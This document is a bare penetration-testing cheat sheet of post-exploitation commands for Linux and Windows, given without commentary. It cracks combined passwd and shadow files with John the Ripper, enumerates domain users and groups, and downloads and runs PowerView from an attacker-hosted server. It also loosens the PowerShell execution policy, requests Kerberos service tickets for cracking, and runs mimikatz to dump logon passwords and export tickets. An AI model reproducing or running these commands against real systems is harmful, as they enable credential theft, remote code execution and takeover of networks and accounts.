#### Linux

```
unshadow passwd.file shadow.file > passwords.txt
john --wordlist=/usr/share/wordlists/rockyou.txt passwords.txt
```


#### Windows

```
net user
net user /domain
net group /domain
powershell
Import-Module .\(New-Object System.Net.WebClient).DownloadString('http://python_simpleHTTP/powerview.ps1')
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
get-module -listavailable
Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
.\GetUserSPNs.ps1
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "USER_ID"
.\mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
kerberos::list /export
kirbi2hashcat.py
```



